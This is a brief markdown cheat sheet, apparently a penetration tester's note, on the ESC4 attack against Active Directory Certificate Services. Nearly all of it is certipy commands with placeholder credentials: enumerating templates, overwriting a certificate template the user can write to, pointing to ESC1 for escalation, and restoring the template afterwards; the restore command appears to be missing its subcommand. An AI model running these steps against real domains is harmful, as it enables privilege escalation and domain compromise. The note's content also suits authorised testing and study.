# ESC4 - Access Control Vulnerabilities

## Enumeration

 - certipy find -u USER@DOMAIN -p PASSWORD -dc-ip DOMAIN_CONTROLLER

## Exploitation

 - certipy template -u USER@DOMAIN -p 'PASSWORD' -template VULN_TEMPLATE -save-old -debug (Write privileges over a certificate template)

### Use ESC1 on vulnerable template

### Then:

 - certipy -u USER@DOMAIN -p 'PASSWORD' -template VULN_TEMPLATE -configuration TEMPLATE.json (Restore template)
